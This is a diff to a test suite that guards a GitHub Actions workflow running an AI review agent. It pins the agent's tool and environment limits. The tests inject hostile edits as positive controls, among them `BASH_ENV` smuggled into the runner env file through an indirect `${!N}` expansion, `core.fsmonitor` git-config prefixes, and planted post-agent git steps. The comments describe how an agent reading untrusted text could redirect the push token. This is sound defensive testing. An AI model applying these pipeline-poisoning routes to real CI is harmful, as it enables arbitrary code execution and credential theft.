@@ -21,7 +21,15 @@ import path from 'node:path';
  * that edits it does nothing and labelling any other PR runs main's copy. A fold run is also
  * expensive and mutates a branch, so it is not something CI can rehearse. These assertions are
  * the only pre-merge evidence the invariants still hold, so they pin the antecedent (`FOLD_MODE`
- * itself) as well as the consequents, and every one of them is scoped to the step it is about.
+ * itself) as well as the consequents.
+ *
+ * Scope is deliberate and not uniform. A gate or a tool list is a property of the step it sits
+ * on, so those are pinned step-scoped; an invariant stated as "a fold cannot push X" or "this job
+ * does not execute checkout bytes" is a property of the FILE, so `gitPushes`, `gitSubcommands`,
+ * `invokedPrograms`, `checkoutCodeReferences`, `runnerFileWrites`, `stepNames` and the
+ * post-agent git-config sweep all read every `run:` body. A step-scoped assertion over one of
+ * those is the shape that has been defeated repeatedly: it makes the bound a property of a NAME,
+ * and any second step doing the same thing is invisible.
  *
  * Where a control is an executable shell fragment it is EXTRACTED FROM THE COMMITTED YAML AND
  * RUN, not pattern-matched. An earlier version of this file asserted only that the guard's text
@@ -34,6 +42,17 @@ import path from 'node:path';
 
 const REPO_ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '../../..');
 const WORKFLOW = path.join(REPO_ROOT, '.github', 'workflows', 'pr-bot-review.yml');
+
+/**
+ * The host tools the harnesses below shell out to, directly or through the `gh`/`git`/`bash`
+ * stubs they put on PATH. Checked once, up front: a host missing one would otherwise fail
+ * partway through a lifted shell body with the stub's own error, which reads as a defect in the
+ * guard rather than as a missing prerequisite. Named so the failure says which one.
+ */
+for (const tool of ['bash', 'git', 'jq', 'awk', 'grep', 'tr', 'mktemp', 'sha256sum', 'cut', 'base64', 'date']) {
+  const found = spawnSync('sh', ['-c', `command -v ${tool}`], { encoding: 'utf8' }).status === 0;
+  if (!found) throw new Error(`checkBotFoldWritePath: required host tool not on PATH: ${tool}`);
+}
 
 /**
  * One `- name: X` step, from its name line up to the next list item at the same indent - or to
@@ -145,6 +164,14 @@ function matchingParen(text: string, open: number): number {
  * because both readings matter: the inner commands are commands, and the enclosing command is
  * handed their output. Flattening it instead - ending the enclosing command at `$(` - meant
  * `bash <<< "$(cat ./scripts/x.sh)"` produced a `bash` command with no path argument at all.
+ *
+ * No `#` and no heredoc handling, and the reliance is stated rather than implied. The bodies this
+ * reads are the ones `runBodies` has comment-stripped for WHOLE lines only, so an apostrophe in a
+ * TRAILING comment opens a quote state that swallows the rest of the body. That is not reachable
+ * as a bypass today, and the reason is worth keeping: an unbalanced quote removes a real entry
+ * from the file-wide `gitSubcommands`/`invokedPrograms` pins, so the suite reds on the edit
+ * itself. Self-announcing, but caught incidentally by a legitimate entry going missing - so a
+ * change to those pins should keep that property in mind.
  */
 function shellCommands(text: string): ShellCommand[] {
   const commands: ShellCommand[] = [];
@@ -295,11 +322,55 @@ const NON_COMMAND_HEAD = /^(fi|for|done|case|esac|in|local|return|exit)$/;
 const DATA_ONLY_COMMANDS =
   /^(git|gh|jq|echo|printf|cat|ls|diff|file|rm|mv|cp|mkdir|touch|sha256sum|cut|tr|head|tail|wc|sort|uniq|sed|grep|test|\[|\[\[|mktemp|date|basename|dirname|read|export|set|shift|unset|true|false|emit|count_since)$/;
 
-// Every quote character that is not itself escaped. Written as an alternation with `\\.` so
-// the escape is CONSUMED rather than used as a lookbehind: with `(^|[^\\])['"]` the character
-// before a quote was eaten by the match, so the second of two adjacent quotes could not match
-// and `''` unquoted to `'`.
-const unquoteWord = (word: string) => word.replace(/\\.|['"]/g, match => (match.length === 2 ? match : ''));
+/**
+ * A shell word with its quoting removed, the way bash builds the word it will execute.
+ *
+ * Quote characters go, and OUTSIDE single quotes a backslash escapes the next character: the
+ * shell consumes the backslash and runs what is left, so `\git` IS the program `git` and `\'`
+ * IS the word `'`. Two earlier forms under-stripped this and each did so where a prefix test
+ * runs: the lookbehind form consumed the character before a quote and so could not match the
+ * second of two adjacent quotes (`'env'` normalized, `''env''` did not), and the pair-preserving
+ * form kept every `\x` verbatim (`'env'` normalized, `\env` did not). Both leave a word that no
+ * `SHELL_PREFIX` or program test matches, which puts the command behind them outside every
+ * by-value bound in this file while the PROGRAMS backstop reports an unknown head - loud, but
+ * only by accident.
+ *
+ * Inside SINGLE quotes a backslash is literal and survives. Inside DOUBLE quotes it escapes only
+ * `"`, `$`, backtick and itself, and is otherwise kept - `"a\b"` is the word `a\b` to bash.
+ */
+function unquoteWord(word: string): string {
+  let out = '';
+  let quote = '';
+  for (let i = 0; i < word.length; i++) {
+    const char = word[i] as string;
+    if (quote === "'") {
+      if (char === "'") quote = '';
+      else out += char;
+      continue;
+    }
+    if (char === '\\') {
+      const next = word[i + 1];
+      if (next === undefined) {
+        out += '\\';
+        continue;
+      }
+      i++;
+      if (quote === '"' && !'"$`\\'.includes(next)) out += '\\';
+      out += next;
+      continue;
+    }
+    if (char === quote) {
+      quote = '';
+      continue;
+    }
+    if (quote === '' && (char === "'" || char === '"')) {
+      quote = char;
+      continue;
+    }
+    out += char;
+  }
+  return out;
+}
 
 /**
  * Tracked repo-root FILES by bare name, read from the index rather than listed here so the set
@@ -479,8 +550,18 @@ const envAssignmentPrefixes = (src: string) =>
         shellCommands(body).flatMap(({ words }) => {
           const names: string[] = [];
           let rest = words;
-          while (rest.length && /^[A-Za-z_][A-Za-z0-9_]*=/.test(rest[0])) {
-            names.push(rest[0].split('=')[0]);
+          // A COMMAND_PREFIX word may sit IN FRONT of the assignments: `env FOO=bar git ...` is
+          // the same command with the same environment as `FOO=bar git ...`, and it runs through
+          // the same `commandProgram` prefix strip. Stopping at word 0 was therefore invisible -
+          // the command still parsed as an allowlisted `git`, so nothing named it. Skip the
+          // prefix the way `programHeads` does and collect assignments on either side of it. The
+          // SHELL_PREFIX words that head a command containing NO program (`for`, `local`,
+          // `exit`) are deliberately not skipped: `for x in ...` would then report `x`.
+          while (rest.length) {
+            const word = unquoteWord(rest[0]);
+            const assignment = word.match(/^([A-Za-z_][A-Za-z0-9_]*)=/);
+            if (assignment) names.push(assignment[1]);
+            else if (!COMMAND_PREFIX.test(word)) break;
             rest = rest.slice(1);
           }
           // A standalone assignment is not a prefix: nothing runs with that environment.
@@ -556,16 +637,72 @@ const runnerFileCommandMentions = (src: string) =>
     .sort();
 
 /**
- * The two sweeps above as ONE value, so one assertion carries both bounds.
+ * Every runner-provided variable a `run:` body EXPANDS, as a whole SET, minus the one this job
+ * is allowed to read.
  *
- * They are halves of a single statement - "this job writes these files and reaches the runner's
- * env-setting files by no route at all" - and split across two `expect`s, deleting the weaker
- * one is a no-op on the shipped file. Measured: with the mentions assertion removed the suite
- * stays green, and only the `tee -a "$GITHUB_PATH"` route reopens. Returned together instead.
+ * `runnerFileCommandMentions` bounds a SPELLING of the name; this bounds the NAME. Reassembling
+ * it (`N=GITHUB_""ENV`, then `${!N}`) puts no such spelling in the body at all: the env file's
+ * path is read out of the variable into `$GITHUB_OUTPUT`, which is allowlisted as a redirection
+ * target, and the append to it sets `BASH_ENV` for every later step - one line, inside an
+ * existing body, at 30/30 green. `$GITHUB_OUTPUT` is the only runner variable any step in this
+ * job has a use for, so any other one has to be justified here.
+ */
+const RUNNER_ENV_ALLOWED = ['GITHUB_OUTPUT'];
+
+const runnerEnvRefs = (src: string) =>
+  [
+    ...new Set(
+      runBodies(src).flatMap(body =>
+        [...body.matchAll(/\$\{?((?:GITHUB|RUNNER|ACTIONS)_[A-Z0-9_]*)/g)].map(match => match[1])
+      )
+    ),
+  ]
+    .filter(name => !RUNNER_ENV_ALLOWED.includes(name))
+    .sort();
+
+/**
+ * Every `${!name}` INDIRECT expansion and every assignment to a runner-provided variable in a
+ * `run:` body, as whole sets.
+ *
+ * The two halves that read or write a runner variable under a name `runnerEnvRefs` cannot see:
+ * `${!N}` reaches `$GITHUB_ENV` through `N`, and `GITHUB_OUTPUT=...` rebinds the one name the
+ * redirection allowlist trusts, which turns a permitted target into any file at all. Neither has
+ * a legitimate use in this job. (`eval`, the third route the same class reaches through, needs no
+ * sweep of its own: it is a program, and the `invokedPrograms` allowlist already refuses one.)
+ */
+const indirectExpansions = (src: string) =>
+  [...new Set(runBodies(src).flatMap(body => [...body.matchAll(/\$\{!/g)].map(() => '${!}')))].sort();
+
+const runnerAssignments = (src: string) =>
+  [
+    ...new Set(
+      runBodies(src).flatMap(body =>
+        shellCommands(body).flatMap(({ words }) =>
+          words.flatMap(word => {
+            const name = /^((?:GITHUB|RUNNER|ACTIONS)_[A-Z0-9_]*)=/.exec(unquoteWord(word))?.[1];
+            return name ? [name] : [];
+          })
+        )
+      )
+    ),
+  ].sort();
+
+/**
+ * The sweeps above as ONE value, so one assertion carries every bound.
+ *
+ * They are halves of a single statement - "this job writes these files, and reaches the runner's
+ * env-setting files by no route at all" - and split across separate `expect`s, deleting the
+ * weaker one is a no-op on the shipped file. Measured: with the mentions assertion removed the
+ * suite stays green, and only the `tee -a "$GITHUB_PATH"` route reopens; likewise the two
+ * reassembly sweeps, whose routes leave no literal `GITHUB_ENV` in the body for `mentions` to
+ * find. Returned together instead.
  */
 const runnerFileWrites = (src: string) => ({
   targets: redirectionTargets(src),
   mentions: runnerFileCommandMentions(src),
+  expansions: runnerEnvRefs(src),
+  indirect: indirectExpansions(src),
+  reassignments: runnerAssignments(src),
 });
 
 /**
@@ -583,16 +720,36 @@ const runnerFileWrites = (src: string) => ({
  */
 const UNNAMED_STEP = '<unnamed step>';
 
-function stepNames(src: string): string[] {
+/**
+ * The job's steps, in file order, each as its name (or `UNNAMED_STEP`) and its whole block.
+ *
+ * `stepNames` is derived from this rather than lifted separately, so the two cannot disagree
+ * about what a step is. Chunks rather than a name list because one assertion needs POSITION
+ * rather than identity: the post-agent git-config sweep has to know which side of the agent a
+ * `git` invocation sits on.
+ *
+ * The list-item marker does not have to carry a name. `-` alone on its line, with the mapping on
+ * the lines below it, is a legal step to YAML and matches no `- name:` sweep - which is how a
+ * twenty-first step stayed green. A name-less item is reported as `UNNAMED_STEP` rather than
+ * skipped, so a pin `toEqual`-ing the committed list reds on it, the same treatment a `run:`-only
+ * step already got.
+ */
+function stepChunks(src: string): { name: string; body: string }[] {
   // `steps:` is the last key of the only job, so its block runs to the end of the file. Lifted
   // by value rather than by a file-wide sweep so a `- ` list under some other key cannot join.
   const block = /^ {4}steps:\n([\s\S]*)$/m.exec(src);
   expect(block, 'the steps: block moved').not.toBeNull();
-  return [...(block?.[1] ?? '').matchAll(/^ {6}- (.*)$/gm)].map(match => {
-    const named = /^name: (.*)$/.exec(match[1]);
-    return named ? named[1] : UNNAMED_STEP;
-  });
+  return (block?.[1] ?? '')
+    .split(/^(?= {6}-(?:\s|$))/m)
+    .filter(chunk => chunk.trim())
+    .map(chunk => {
+      const head = /^ {6}-(?: (.*))?$/m.exec(chunk);
+      const named = /^name: (.*)$/.exec(head?.[1] ?? '');
+      return { name: named ? named[1] : UNNAMED_STEP, body: chunk };
+    });
 }
+
+const stepNames = (src: string) => stepChunks(src).map(({ name }) => name);
 
 /**
  * Every invocation of a program matching `name` anywhere in a `run:` body, as parsed word
@@ -777,18 +934,50 @@ function checkoutCodeReferences(src: string): string[] {
   return hits;
 }
 
+/**
+ * The key/value pairs of a YAML mapping at a fixed indent, as ONE shared reader.
+ *
+ * PARSE OR REFUSE, because every caller is a key-set bound and a reader that quietly drops a
+ * line it does not recognise under-states the set it exists to pin. YAML reads a plain key, a
+ * `'single'`-quoted one and a `"double"`-quoted one as the same key, so a reader matching one
+ * spelling leaves the other two invisible: `"BASH_ENV": /tmp/x.sh` added to a step's `env:` - or
+ * to the JOB's, which reaches every step - puts a real variable in the environment while the
+ * pins read the block as unchanged. A line at the key indent that is NOT a key is refused
+ * outright rather than skipped, so a reader can never silently under-count again.
+ *
+ * A deeper line belongs to the previous key's value (a block scalar, say) and is not a key.
+ */
+function mappingEntries(block: string, indent: number, label: string): [string, string][] {
+  const prefix = ' '.repeat(indent);
+  const entries: [string, string][] = [];
+  for (const line of block.split('\n')) {
+    if (!line.trim() || /^\s*#/.test(line)) continue;
+    if (!line.startsWith(prefix)) {
+      throw new Error(`${label}: line is not indented to the key column: ${JSON.stringify(line)}`);
+    }
+    const body = line.slice(prefix.length);
+    // A line indented PAST the key column belongs to the previous key's value (a block scalar,
+    // say), and is not a key.
+    if (body.startsWith(' ')) continue;
+    const match = body.match(/^((?:"[^"]*"|'[^']*'|[A-Za-z_][A-Za-z0-9_-]*)):(?: ?(.*))?$/);
+    if (!match) throw new Error(`${label}: line at key indent is not a key: ${JSON.stringify(line)}`);
+    entries.push([(match[1] ?? '').replace(/^(['"])([\s\S]*)\1$/, '$2'), match[2] ?? '']);
+  }
+  return entries;
+}
+
 /** The keys of a step's `with:` mapping, in file order. */
 function withKeys(src: string, name: string): string[] {
   const block = step(src, name).match(/^ {8}with:\n((?: {10}.*\n|\n)+)/m)?.[1];
   expect(block, `${name}: no with: block`).toBeTruthy();
-  return [...(block ?? '').matchAll(/^ {10}([a-z0-9_-]+):/gm)].map(m => m[1]);
+  return mappingEntries(block ?? '', 10, `${name} with:`).map(([key]) => key);
 }
 
 /** A step's `env:` block as ordered key/value pairs, comment lines dropped. */
 function envPairs(src: string, name: string): [string, string][] {
   const block = step(src, name).match(/^ {8}env:\n((?: {10}.*\n|\n)+)/m)?.[1];
   expect(block, `${name}: no env: block`).toBeTruthy();
-  return [...(block ?? '').matchAll(/^ {10}([A-Za-z_][A-Za-z0-9_]*): ?(.*)$/gm)].map(m => [m[1], m[2]]);
+  return mappingEntries(block ?? '', 10, `${name} env:`);
 }
 
 const envKeys = (src: string, name: string) => envPairs(src, name).map(([key]) => key);
@@ -1088,7 +1277,11 @@ function runStagedGuards(
       fs.mkdirSync(path.join(fakeHome, '.config', 'git'), { recursive: true });
       fs.writeFileSync(path.join(fakeHome, '.config', 'git', 'attributes'), `${home.attributes}\n`);
     }
-    const env: NodeJS.ProcessEnv = { ...process.env, HOME: fakeHome };
+    // TMPDIR inside the scratch dir so the `mktemp` files the lifted region creates are removed
+    // with it. On the host temp dir they accumulate - one focused run left 74 of them behind.
+    const scratchTmp = path.join(dir, 'tmp');
+    fs.mkdirSync(scratchTmp);
+    const env: NodeJS.ProcessEnv = { ...process.env, HOME: fakeHome, TMPDIR: scratchTmp };
     // Or git reads $XDG_CONFIG_HOME/git/attributes from the DEVELOPER's home instead.
     delete env.XDG_CONFIG_HOME;
     const run = spawnSync('bash', ['-c', script], { cwd: dir, encoding: 'utf8', env, timeout: 120_000 });
@@ -1184,7 +1377,10 @@ function runPushStep(src: string, fixture: PushFixture): PushOutcome {
     const work = path.join(root, 'work');
     const home = path.join(root, 'home');
     const bin = path.join(root, 'bin');
-    for (const dir of [work, home, bin]) fs.mkdirSync(dir);
+    // `tmp` so the body's two `mktemp` files are removed with the scratch root rather than
+    // accumulating in the host temp dir.
+    const tmp = path.join(root, 'tmp');
+    for (const dir of [work, home, bin, tmp]) fs.mkdirSync(dir);
     const git = (cwd: string, ...args: string[]) =>
       execFileSync('git', ['-C', cwd, '-c', 'user.name=t', '-c', 'user.email=t@example.com', ...args], {
         encoding: 'utf8',
@@ -1261,6 +1457,7 @@ function runPushStep(src: string, fixture: PushFixture): PushOutcome {
       FOLD_TEST_REMOTE: remote,
       FOLD_TEST_GIT: execFileSync('sh', ['-c', 'command -v git'], { encoding: 'utf8' }).trim(),
       HOME: home,
+      TMPDIR: tmp,
       GITHUB_OUTPUT: outputs,
       // The step's own `env:` block, READ FROM THE YAML rather than copied here. A copy made
       // this harness blind to the one edit that changes what the shipped `run:` body executes
@@ -1380,6 +1577,10 @@ function runPostedCheck(src: string, fixture: PostedFixture): string {
     );
     const outputs = path.join(dir, 'outputs');
     fs.writeFileSync(outputs, '');
+    // See `runStagedGuards`: the body's `count_since` makes a `mktemp` per call, and TMPDIR keeps
+    // those inside the scratch dir that is removed at the end of this function.
+    const tmp = path.join(dir, 'tmp');
+    fs.mkdirSync(tmp);
     const run = spawnSync('bash', ['-c', body ?? ''], {
       cwd: dir,
       encoding: 'utf8',
@@ -1388,6 +1589,7 @@ function runPostedCheck(src: string, fixture: PostedFixture): string {
         ...process.env,
         PATH: `${bin}${path.delimiter}${process.env.PATH ?? ''}`,
         GITHUB_OUTPUT: outputs,
+        TMPDIR: tmp,
         GH_TOKEN: 'stub',
         BOT_REVIEW_LOGIN: BOT_LOGIN,
         REPO: 'owner/repo',
@@ -1504,11 +1706,26 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // the runner's own Actions credentials out of every subprocess the agent's tools spawn and
     // pins the permission mode to `default`; it is the second line of the no-shell posture, and
     // deleting it turned nothing in this file red.
-    expect([...jobs.matchAll(/^ {6}([A-Z][A-Z0-9_]*):/gm)].map(m => m[1])).toEqual([
-      'CLAUDE_CODE_SUBPROCESS_ENV_SCRUB',
-      'FOLD_MODE',
+    //
+    // Read through the shared mapping reader, not a `matchAll` over the whole job block: this is
+    // a key-SET bound, so a reader that under-counts is not a weaker assertion but a false one,
+    // and a `"BASH_ENV":` key here would set a variable for every step in the job while a
+    // bare-token `matchAll` reported the block unchanged.
+    const jobEnv = /^ {4}env:\n((?: {6}.*\n|\n)*)/m.exec(jobs)?.[1];
+    expect(jobEnv, 'the job env: block moved').toBeTruthy();
+    expect(mappingEntries(jobEnv ?? '', 6, 'job env')).toEqual([
+      ['CLAUDE_CODE_SUBPROCESS_ENV_SCRUB', "'1'"],
+      ['FOLD_MODE', "${{ github.event.label.name == 'bot-fold' }}"],
     ]);
-    expect(jobs).toMatch(/^ {6}CLAUDE_CODE_SUBPROCESS_ENV_SCRUB: '1'$/m);
+    // POSITIVE CONTROL, on the spelling the old reader could not see. A quoted key is the same
+    // key to YAML and the same variable to the runner, and it reaches this pin as a change
+    // rather than as nothing.
+    const quotedJobKey = src.replace(/^( {6})FOLD_MODE:/m, `$1"BASH_ENV": /tmp/x.sh\n$1FOLD_MODE:`);
+    expect(quotedJobKey, 'the job env injection anchor moved').not.toBe(src);
+    const quotedJobEnv = /^ {4}env:\n((?: {6}.*\n|\n)*)/m.exec(quotedJobKey)?.[1] ?? '';
+    expect(mappingEntries(quotedJobEnv, 6, 'job env').map(([key]) => key)).toContain('BASH_ENV');
+    // And a line that is not a key at all is refused rather than dropped.
+    expect(() => mappingEntries('      :: not a key\n', 6, 'probe')).toThrow(/not a key/);
   });
 
   it('denies Bash in every mode, and grants it in none', () => {
@@ -1585,11 +1802,14 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
   });
 
   it('fences the fold write tools by Edit() spec, the only spelling the CLI honours', () => {
-    // Spelling first, because getting it wrong is silent. `Write(path)` and
-    // `MultiEdit(path)` specs are IGNORED by the file-permission checks - the CLI says
-    // so on stderr and exits 0 - while an `Edit(path)` rule covers every file-editing
-    // tool. A previous revision carried all three spellings for both roots, which read
-    // as six controls and was two, and is how the $RUNNER_TEMP hole below got missed.
+    // Spelling first, because getting it wrong is silent. A path rule naming `Write` or
+    // `MultiEdit` is IGNORED by the file-permission checks - accepted, never consulted, so
+    // it reads exactly like a live control - while an `Edit(path)` rule covers every
+    // file-editing tool. Do not lean on the CLI's warning about an ignored spec either: it
+    // is emitted per output mode, and this job runs the action's JSON stream, where it can
+    // land in the debug log instead of anywhere a reader here would see it. A previous
+    // revision carried all three spellings for both roots, which read as six controls and
+    // was two, and is how the $RUNNER_TEMP hole below got missed.
     const deny = toolListModes(toolFlagValues(src, 'disallowedTools')[0]);
     const pathSpecs = deny.fold.filter(spec => spec.includes('('));
     expect(pathSpecs.filter(spec => /^(Write|MultiEdit)\(/.test(spec))).toEqual([]);
@@ -1667,6 +1887,13 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // asked.
     expect(step(src, 'Run /bot-review')).toMatch(/^ {8}uses: anthropics\/claude-code-action@v1$/m);
     expect(withKeys(src, 'Run /bot-review').sort()).toEqual(['anthropic_api_key', 'claude_args', 'prompt']);
+    // POSITIVE CONTROL, on the spelling a bare-token reader cannot see. `"settings"` is the same
+    // input to the action as `settings` is, and `settings` is the one that writes
+    // `$HOME/.claude/settings.json` with its `hooks` block - so a quoted spelling that the pin
+    // read as unchanged was a hole in the assertion that exists to close exactly that route.
+    const quotedWithKey = src.replace(/^( {10})claude_args:/m, `$1"settings": ./probe-settings.json\n$1claude_args:`);
+    expect(quotedWithKey, 'the with: injection anchor moved').not.toBe(src);
+    expect(withKeys(quotedWithKey, 'Run /bot-review')).toContain('settings');
     assertArgSurface(claudeArgTokens(src));
     // And again with each `${{ }}` standing for several words, one of them a flag. GitHub
     // expands these before the action shell-parses the result, so an UNQUOTED expansion is
@@ -1966,8 +2193,20 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // `set -euo pipefail` does not catch it - and this is all UPSTREAM of the path guard,
     // the size bound and --no-verify. The same file also reaches `http.proxy` and
     // `url.<base>.insteadOf`, either of which hands the push token to a chosen host.
-    for (const name of ['Push fold commit', 'Redact and upload review transcript']) {
-      const stepSrc = step(src, name);
+    //
+    // The set is DERIVED from position, not listed. It used to be two hardcoded step names, so
+    // the invariant was a property of those two names rather than of running git after the agent
+    // reading untrusted text: a `git log --oneline -1` added to any later step ran with whatever
+    // `$HOME` config the agent had planted and nothing here looked. Every step whose body invokes
+    // git, at or after the agent, is swept; every one before it is upstream of the agent and has
+    // no planted config to worry about. The names are pinned by value as well, so a new
+    // post-agent git step is a deliberate edit rather than a silent addition.
+    const steps = stepChunks(src);
+    const agentIndex = steps.findIndex(({ name }) => name === 'Run /bot-review');
+    expect(agentIndex, 'the agent step moved').toBeGreaterThan(-1);
+    const postAgentGit = steps.filter(({ body }, index) => index > agentIndex && gitInvocations(body).length > 0);
+    expect(postAgentGit.map(({ name }) => name)).toEqual(['Push fold commit', 'Redact and upload review transcript']);
+    for (const { name, body: stepSrc } of postAgentGit) {
       expect(stepSrc, `${name}: no GIT_CONFIG_GLOBAL`).toMatch(/^ {10}GIT_CONFIG_GLOBAL: \/dev\/null$/m);
       expect(stepSrc, `${name}: no GIT_CONFIG_SYSTEM`).toMatch(/^ {10}GIT_CONFIG_SYSTEM: \/dev\/null$/m);
       expect(stepSrc, `${name}: no GIT_CONFIG_NOSYSTEM`).toMatch(/^ {10}GIT_CONFIG_NOSYSTEM: '1'$/m);
@@ -1985,6 +2224,21 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       // file-command sweep, which does not rest on Actions env precedence.
       expect(stepSrc, `${name}: no GIT_CONFIG_PARAMETERS`).toMatch(/^ {10}GIT_CONFIG_PARAMETERS: ''$/m);
     }
+    // POSITIVE CONTROL for the derivation, on the axis the two-name list was blind to: the same
+    // invocation in a step nobody thought to name. It has to arrive as a THIRD post-agent git
+    // step, and to arrive without the five vars - which is the whole of the failure above.
+    const plantedGit = src.replace(
+      /^ {6}- name: Report skill-fetch failure$/m,
+      `      - name: Summarise the fold\n        run: |\n          git log --oneline -1\n      - name: Report skill-fetch failure`
+    );
+    expect(plantedGit, 'the injection anchor moved').not.toBe(src);
+    const plantedSteps = stepChunks(plantedGit);
+    const plantedAgent = plantedSteps.findIndex(({ name }) => name === 'Run /bot-review');
+    const plantedPostAgent = plantedSteps.filter(
+      ({ body }, index) => index > plantedAgent && gitInvocations(body).length > 0
+    );
+    expect(plantedPostAgent.map(({ name }) => name)).toContain('Summarise the fold');
+    expect(plantedPostAgent.find(({ name }) => name === 'Summarise the fold')?.body).not.toMatch(/GIT_CONFIG_GLOBAL/);
     // And the whole `env:` KEY SET of both, by value. The line above only asserts that
     // `GIT_CONFIG_COUNT: '0'` is PRESENT, which stays true while `GIT_CONFIG_KEY_0` and
     // `GIT_CONFIG_VALUE_0` are added beside it - and an env edit changes what the `run:` body
@@ -2041,15 +2295,30 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     // earlier step, pinned empty above and bounded at its delivery route by the runner
     // file-command sweep.
     expect(envAssignmentPrefixes(src)).toEqual([]);
-    expect(
-      envAssignmentPrefixes(
-        src.replace(
-          /^ {6}- name: Report skill-fetch failure$/m,
-          `      - name: Publish the fold\n        run: |\n          GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor git ls-files\n      - name: Report skill-fetch failure`
-        )
-      ),
-      'an environment assignment prefix was not seen'
-    ).toEqual(['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']);
+    for (const [prefix, expected] of [
+      // POSITIVE CONTROLS, one per position the assignments may occupy. The first is the plain
+      // form. The second puts a COMMAND_PREFIX word in FRONT of them - the same command with the
+      // same environment, and the one a loop that stopped at word 0 read as no assignment at
+      // all: `commandProgram` strips `env` too, so the command still parsed as an allowlisted
+      // `git` and nothing named it.
+      ['', ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']],
+      ['env ', ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']],
+      // And the quoted prefix, for the reason `commandProgram` normalizes before it tests.
+      ["'env' ", ['GIT_CONFIG_COUNT', 'GIT_CONFIG_KEY_0']],
+      // A SHELL_PREFIX word that heads a command with NO program in it is deliberately NOT
+      // skipped: `for` is in `SHELL_PREFIX` but not in `COMMAND_PREFIX`, so the loop stops
+      // there - which is what keeps a loop variable from being reported as an assignment.
+      ['for ', []],
+    ] as Array<[string, string[]]>) {
+      const mutated = src.replace(
+        /^ {6}- name: Report skill-fetch failure$/m,
+        `      - name: Publish the fold\n        run: |\n          ${prefix}GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.fsmonitor git ls-files\n      - name: Report skill-fetch failure`
+      );
+      expect(mutated, 'the injection anchor moved').not.toBe(src);
+      expect(envAssignmentPrefixes(mutated), `an environment assignment prefix was not seen: ${prefix}`).toEqual(
+        expected
+      );
+    }
     // With the global config nulled, `git config user.email` would write to /dev/null and
     // the commit would come out unattributed - which cla.yml and main-protection both key
     // off. Identity has to be passed per-invocation instead.
@@ -2070,7 +2339,13 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     //
     // The shipped set of redirect targets is six, all of them the job's own step outputs, its
     // own scratch files or /dev/null, which is the tightest allowlist available here.
-    expect(runnerFileWrites(src)).toEqual({ targets: REDIRECTION_TARGETS, mentions: [] });
+    expect(runnerFileWrites(src)).toEqual({
+      targets: REDIRECTION_TARGETS,
+      mentions: [],
+      expansions: [],
+      indirect: [],
+      reassignments: [],
+    });
     // POSITIVE CONTROLS, one per route. The first is the shape that was 28/28 green: one line
     // APPENDED to an existing body, no new step, no changed `env:` block, and `echo` is both an
     // allowlisted program and a data-only one, so every other sweep in this file reads the file
@@ -2090,6 +2365,28 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
     const glued = src.replace(/^( +)(echo "at=\$\(date .*\n)/m, `$1$2$1echo x >>"$GITHUB_ENV"\n`);
     expect(glued, 'the glued anchor moved').not.toBe(src);
     expect(redirectionTargets(glued), 'a glued redirection target was not seen').toContain('"$GITHUB_ENV"');
+    // THE REASSEMBLED ROUTE, which no spelling sweep can see: the name is never written down, so
+    // `mentions` reads the body as clean and the redirection is to `$GITHUB_OUTPUT`, which the
+    // target allowlist permits. `N` holds `GITHUB_ENV`'s value, and `$GITHUB_OUTPUT` is rebound to
+    // it - so the append lands in the runner env file and sets a variable for every later step.
+    // Both halves are asserted, because they are two independent writes: the reassignment of the
+    // one trusted target name and the indirect expansion that reads the untrusted one.
+    const reassembled = src.replace(
+      /^( +)(echo "at=\$\(date .*\n)/m,
+      `$1$2$1N=GITHUB_""ENV\n$1GITHUB_OUTPUT=\${!N}\n$1printf '%s\\\\n' 'BASH_ENV=/tmp/x.sh' >> "$GITHUB_OUTPUT"\n`
+    );
+    expect(reassembled, 'the reassembly anchor moved').not.toBe(src);
+    expect(indirectExpansions(reassembled), 'an indirect expansion was not seen').toEqual(['${!}']);
+    expect(runnerAssignments(reassembled), 'a rebinding of a runner variable was not seen').toEqual(['GITHUB_OUTPUT']);
+    // The paired control: the shipped bytes read clean on BOTH new sweeps, so neither of them is
+    // passing merely because the helper returns nothing for anything.
+    expect(indirectExpansions(src)).toEqual([]);
+    expect(runnerAssignments(src)).toEqual([]);
+    // And a plain expansion of the same name is refused, which is the tighter statement - the
+    // allowlist is one name, not "anything that is not GITHUB_ENV".
+    const expanded = src.replace(/^( +)(echo "at=\$\(date .*\n)/m, `$1$2$1echo x >> "\${GITHUB_ENV}"\n`);
+    expect(expanded, 'the expansion anchor moved').not.toBe(src);
+    expect(runnerEnvRefs(expanded), 'a direct expansion of a runner variable was not seen').toEqual(['GITHUB_ENV']);
 
     // The step list itself, by value. Every sweep in this file runs over whatever steps exist,
     // so none of them can say "and no others" - a whole new step was 28/28 green, and the step
@@ -2117,20 +2414,27 @@ describe('bot-fold write path', { timeout: 180_000 }, () => {
       'Report skill-fetch failure',
       'Remove re-review label',
     ]);
-    // POSITIVE CONTROLS: a new step in either spelling. `name:` is optional in the step schema
-    // and an unnamed step has blinded four sweeps in this file at once before, so it has to
-    // REACH the pin rather than be skipped by it.
-    for (const injected of [
-      '      - name: Publish the fold\n        run: |\n          echo hi\n',
-      '      - run: |\n          echo hi\n',
-      '      - uses: actions/checkout@v5\n',
-    ]) {
+    // POSITIVE CONTROLS: a new step in every spelling the list item may take. `name:` is optional
+    // in the step schema and an unnamed step has blinded four sweeps in this file at once before,
+    // so it has to REACH the pin rather than be skipped by it. The last two are the bare `-`
+    // shapes: `-` alone on its line, with the mapping below it, is a legal step to YAML and
+    // matched no `- ` sweep at all - so a whole `uses:` step (which has no `run:` body and so
+    // trips none of the body sweeps either) was green across every assertion in this file.
+    for (const [injected, unnamed] of [
+      ['      - name: Publish the fold\n        run: |\n          echo hi\n', false],
+      ['      - run: |\n          echo hi\n', true],
+      ['      - uses: actions/checkout@v5\n', true],
